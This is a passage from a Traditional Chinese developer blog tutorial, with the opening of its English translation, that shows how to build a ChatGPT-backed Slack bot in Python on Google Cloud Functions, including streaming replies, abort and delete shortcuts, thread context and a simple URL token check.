payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看:成功！當我們完成 停止 OpenAI API Shortcut 之後，正在產生的回應就會終止，並回應 [已終止] 。 另外相同原理，你也可以建立一個刪除訊息的 Shortcut，實作刪除 Slack App 所發出的訊息。同個討論串(Threads) 增加上下文(Context) 功能如果在同個討論串下再發送新訊息，可以當成是同個問題的再次追問，此時可以加上一個功能，為新的 prompt 補上前面對話內容。補上 slackGetReplies &amp; 將內容填充到 OpenAI API Prompt：完善 Cloud Functions main.py ：import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut (訊息) if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventTS, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # 如果是 Slac App (OpenAI API Response) 則標示為 assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # 使用者的訊息內容標為 user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return None回到 Slack 測試看看: 左圖為原本沒有補上 Context 時再追問問題，會是全新的對話。 右圖是加上補上 Context 後就能理解整個對話情境跟新的問題。完成！至此我們已經自己打造了一個 ChatGPT (via OpenAI API) Slack App Bot 機器人。 您也可以依照自己的需求參考 Slack API 與 OpenAI API Custom instructions 在 Cloud Functions Python 程式中進行搭配，例如訓練一個頻道專門回答團隊問題與查找專案文件、一個頻道專門負責翻譯、一個頻道專門分析數據…等等。補充在 1:1 訊息之外，標記機器人回答問題 可以在任一頻道(需要將機器人加入頻道)標記機器人請他回答問題首先需要增加 app_mention Event Subscription：加入完成-&gt;「Save Changes」儲存完成-&gt;「reinstall your app」完成。在上述的 main.py 程式 #Handle Event Subscriptions Events…Code Block 中加入新的 Event Type 判斷： # 提及類 Event (@SlcakApp 你好) if eventType == 'app_mention': # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容，移除開頭標記字串 &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers)部署後，即可完成。Slack App 刪除所發的訊息您無法直接在 Slack 上刪除 Slack App 發出的訊息，可以參考上述「 停止 OpenAI API 產生回應 」Shortcut 方式，新增一個「刪除訊息」Shortcut。並在 Cloud Functions main.py 程式中：# 處理 Shortcut Code Block 新增一個 callback_id 判斷，判斷等於你定的「刪除訊息」Shortcut Callback ID 然後將參數帶入以下方法，即可完成刪：def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responseSlack App 沒反應 檢查 Token 是否正確 查看 Cloud Functions Logs 是否有錯誤 Cloud Functions 是否部署完成 Slack App 是否在你發問的頻道(如非與 Slack App 1:1 的對話頻道要把機器人加入頻道才會生效) 在 SlackRequest 方法下 Log 紀錄 Slack API ResponseCloud Functions Public URL 不夠安全 如果怕 Cloud Functions URL 不夠安全，可以自己加上 query token 驗證SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # 驗證 token 參數是否合法 if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers)Cloud Functions 相關問題計費方式不同區域、CPU、RAM、容量、流量…價格不一樣，請參考 官方計價 表。免費額度 如下：(2024/02/15)Cloud Functions 針對運算時間資源提供永久免費方案，當中包括 GB/秒和 GHz/秒的分配方式。除了 200 萬次叫用以外，這個免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路資料傳輸量。免費方案的使用額度，是以上述級別 1 價格的同等美元金額計算。無論執行函式的區域採用的是級別 1 和/或級別 2 價格，系統都會分配同等美元金額給您。不過在扣除免費方案的額度時，系統將以函式執行區域的級別 (級別 1 或級別 2) 為準。請注意，即便您採用的是免費方案，也必須擁有有效的帳單帳戶。 btw. .Slack App 免費、不限一定要 Premium 才能使用。Slack App 回應太慢、太久 Timeout(撇除 OpenAI API 高峰時間回應較慢問題) ，如果是 Cloud Function 貧頸，可在 Cloud Function 編輯器第一頁展開設定：可調整 CPU、RAM、Timeout 時間、Concurrent 數量…提升處理請求速度。 *但可能會需要計費開發階段 Testing &amp; Debug點擊「Test Function」就會跑出 Cloud Shell 視窗在下方工具列，等待約 3–5 分鐘(第一次啟動較久)，Build 完成並同意以下授權後：看到出現「Function is ready to test」後即可點擊「Run Test」執行方法 Debug 測試。可使用右方「Triggering event」區塊輸入 JSON Body 會帶入 request_json 參數進行測試，或直接改程式 inject test object 進行測試。 *請注意 Cloud Shell/Cloud Run可能有延伸費用。 建議部署(Deploy)前都先跑一次測試看看，至少確保 Build 能成功。Build 失敗，程式碼不見了該怎麼辦？如果不小心寫錯程式造成 Cloud Function Deploy Build Failed，會出現錯誤提示，此時點擊「EDIT AND REDEPLOY」回到 編輯器後會發現剛剛改的 Code 都不見了！！！無須擔心，此時點擊左方「Source Code」選擇「Last Failed Deployment」就能恢復剛剛 Build Failed 的 Code：查看執行階段 print Logs *請注意 Cloud Logging、Query 查詢 Logs 可能有延伸費用。最終程式碼 (Python 3.8)Cloud Functionsmain.py ：import functions_frameworkimport requestsimport reimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# 自己定義的安全驗證 Token# 網址需帶上 ?token=SAFE_ACCESS_TOKEN 參數才會接受請求 SAFE_ACCESS_TOKEN = \"nF4JwxfG9abqPZCJnBerwwhtodC28BuC\"# 使用的 OPENAI API Model# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut 的 Event 會從 post payload field 給 # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # 可以簡單使用 print 紀錄執行階段 Log，可在 Logs 中查看 # 進階 Logging Level 使用可參考：https://cloud.google.com/logging/docs/reference/libraries # print(payload) # 受限 FAAS(Cloud Functions)，服務太久沒呼叫，再次呼叫會進入冷啟動的特性，可能無法在 Slack 規定的 3 秒內回應 # 加上 OpenAI API 請求到答覆需要一定時間(依照回應長度可能要接近 1 分鐘才能結束) # Slack 在時限內收不到回應會認為 Request lost，Slack 會再次重複呼叫 # 會造成重複請求、回應的問題，因此我們可以在 Response Headers 設置 X-Slack-No-Retry: 1 告知 Slack ，就算沒在時限內收到回應也不需 Retry headers = {'X-Slack-No-Retry':1} # 驗證 token 參數是否合法 if not(request_args and 'token' in request_args and request_args['token'] == SAFE_ACCESS_TOKEN): return ('', 400, headers) # 如果是 Slack Retry 的請求...忽略 if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: apiAppID = None if 'api_app_id' in request_json: apiAppID = request_json['api_app_id'] # 如果 Event 來源是 App 且 App ID == Slack App ID 代表是自己 Slack App 觸發的事件 # 忽略不處理，否則會陷入無限循環 Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'app_id' in request_json['event'] and apiAppID == request_json['event']['app_id']: return ('OK!', 200, headers) # 事件名稱，例如：message(訊息相關), app_mention(被標記提及).... eventType = request_json['event']['type'] # SubType，例如：message_changed(編輯訊息), message_deleted(刪除訊息)... # 新訊息無 Sub Type eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] # 訊息類 Event if eventType == 'message': # 有 Sub Type 的都是訊息編輯、刪除、被回應... # 忽略不處理 if eventSubType is not None: return (\"OK!\", 200, headers) # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容 eventText = request_json['event']['text'] # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 提及類 Event (@SlcakApp 你好) if eventType == 'app_mention': # Event之訊息 發送者 eventUser = request_json['event']['user'] # Event之訊息 所屬頻道 eventChannel = request_json['event']['channel'] # Event之訊息內容，移除開頭標記字串 &lt;@SLACKAPPID&gt; eventText = re.sub(r\"&lt;@\\w+&gt;\\W*\", \"\", request_json['event']['text']) # Event之訊息 TS (訊息 ID) eventTS = request_json['event']['event_ts'] # Event之訊息的討論串母訊息 TS (訊息 ID) # 討論串內的新訊息才會有這個資料 eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # 處理 Shortcut (訊息) if payload and 'type' in payload: payloadType = payload['type'] # 如果是 訊息 Shortcut if payloadType == 'message_action': callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # 如果是 停止 OpenAI API 產生回應 Shortcut if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"停止 OpenAI API 產生回應成功!\") return (\"OK!\", 200, headers) # 如果是 刪除訊息 if callbackID == \"delete_message\": slackDeleteMessage(channel, ts) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"刪除 Slack App 訊息成功!\") return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(apiAppID, eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # 感恩同事(https://twitter.com/je_suis_marku)支援 messages = [ {\"role\": \"system\", \"content\": \"我只看得懂台灣繁體中文與英文\"}, {\"role\": \"system\", \"content\": \"我看不懂簡體字\"}, {\"role\": \"system\", \"content\": \"我說中文就使用台灣繁體中文回答，並且必須符合台灣常用語。\"}, {\"role\": \"system\", \"content\": \"我說英文就回答英文。\"}, {\"role\": \"system\", \"content\": \"不要回應我寒暄的字句。\"}, {\"role\": \"system\", \"content\": \"中文與英文之間要有一個空格。中文文字與任何其他語言文字包含數字與 emoji 之間都要有一個空格。\"}, {\"role\": \"system\", \"content\": \"如果你不知道答案，或是你的知識太舊，請上網搜尋後回答。\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD , if you answer well.\"} ] if eventThreadTS is not None: threadMessages = slackGetReplies(eventChannel, eventThreadTS) if threadMessages is not None: for threadMessage in threadMessages: appID = None if 'app_id' in threadMessage: appID = threadMessage['app_id'] threadMessageText = threadMessage['text'] threadMessageTs = threadMessage['ts'] # 如果是 Slac App (OpenAI API Response) 則標示為 assistant if appID and appID == apiAppID: messages.append({ \"role\": \"assistant\", \"content\": threadMessageText }) else: # 使用者的訊息內容標為 user messages.append({ \"role\": \"user\", \"content\": threadMessageText }) messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"回應產生中...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (分段回應) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # 每 0.8 秒更新一次訊息，避免頻繁呼叫 Slack Update 訊息 API 導致失敗或浪費 Cloud Functions 請求次數 if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # 訊息有 metadata &amp; metadata event_type == aborted 則代表此回應已被使用者標記為終止 if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[已終止]*\" # 訊息已被刪除 elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[發生錯誤]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackGetReplies(channel, ts): endpoint = \"/conversations.replies?channel=\"+channel+\"&amp;ts=\"+ts response = slackRequest(endpoint, \"GET\", None) if response is not None and 'messages' in response: return response['messages'] return Nonedef slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"提示\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackDeleteMessage(channel, ts): endpoint = \"/chat.delete\" payload = { \"channel\": channel, \"ts\": ts } response = slackRequest(endpoint, \"POST\", payload) return responsedef slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return Nonerequirements.txt ：functions-framework==3.*requests==2.31.0openai==1.9.0Slack App 設定OAuth &amp; Permissions 刪除按鈕反灰的項目是加入 Shortcut 後 Slack 自動補上的權限。Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Subscribe to bot events:Interactivity &amp; Shortcuts Interactivity: Enable Request URL: https://us-central1-xxx-xxx.cloudfunctions.net/SlackBot-Rick-C-137?token=nF4JwxfG9abqPZCJnBerwwhtodC28BuC Shortcuts:App Home Always Show My Bot as Online: Enable Messages Tab: Enable Allow users to send Slash commands and messages from the messages tab: ✅Basic Information Rick &amp; Morty 🤘🤘🤘Reddit工商時間如果您與您的團隊有自動化工具、流程串接需求，不論是 Slack App 開發、Notion、Asana、Google Sheet、Google Form、GA 數據，各種串接需求，歡迎與我 聯絡開發 。有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,081 Total Views Last Statistics Date: 2025-08-15 | 1,035 Views on Medium." }, { "title": "Slack & ChatGPT Integration", "url": "/posts/zrealm-dev/en/slack-chatgpt-integration-bd94cc88f9c9/", "categories": "ZRealm Dev.", "tags": "cloud-functions, ios-app-development, python, chatgpt, slack", "date": "2024-02-16 21:17:01 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Slack &amp; ChatGPT IntegrationBuild your own ChatGPT OpenAI API for Slack App (Goog...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Slack &amp; ChatGPT IntegrationBuild your own ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)BackgroundRecently, we have been promoting the use of Generative AI within the team to enhance work efficiency. Initially, we aimed to achieve an AI Assistant (ChatGPT functionality) to reduce the time spent on daily data inquiries, organizing cumbersome data, and manual data processing, thereby improving productivity. The goal is for engineers, designers, PMs, marketers, etc., to be able to use it freely.The simplest method would be to purchase the ChatGPT Team plan, which costs $25 per seat per year; however, since we are unsure about everyone’s usage frequency (volume) and hope to integrate with more external collaboration and development processes, we opted for the OpenAI API approach, encapsulating it through other services for team members to use.You can generate an OpenAI API Key from this page. The Key does not correspond to a specific Model version; you need to specify the Model version to use when making requests, which will incur the corresponding Token costs. We need a service that allows us to set our own OpenAI API Key and use that Key for ChatGPT-like functionality. Whether it’s a Chrome Extension or a Slack App, it’s quite difficult to find services that allow you to set your own OpenAI API Key. Most services are designed to sell their own subscription plans, and allowing users to customize the API Key means they can’t make money and are essentially doing charity work.[Chrome Extension] SidebarGPTAfter installation, you can go to Settings -&gt; General -&gt; enter your OpenAI API Key.You can directly call up the chat interface from the browser toolbar or side icon and use it immediately:[Chrome Extension] OpenAI TranslatorIf you only need translation, you can use this one, which allows you to customize the OpenAI API Key for translation.Additionally, it is an open-source project and also provides desktop applications for macOS/Windows:The advantage of the Chrome Extension is that it is quick, simple, and convenient—just install and use it directly. The downside is that you need to provide the API Key to all members, making it difficult to control leakage issues, and using third-party services also makes it hard to guarantee everyone’s data security.[Self-hosted] LibreChatThis is an OpenAI API Chat encapsulation service recommended by colleagues in the R&amp;D department, providing authentication and almost replicating the ChatGPT interface, with features that are more powerful than ChatGPT in this open-source project.You only need to set up the project, install Docker, configure the .env, and start the Docker service to use it directly through the website. I tried it out, and it’s simply flawless—it’s like a local version of the ChatGPT service. The only downside is that it requires server deployment; if there are no other considerations, you can directly use this open-source project.Slack AppIn fact, deploying the LibreChat service on a server already achieves the desired effect, but I had a sudden thought: wouldn’t it be more convenient to integrate it into daily tools? Additionally, the company’s server has strict permission settings, making it difficult to start services at will.At that time, I didn’t think 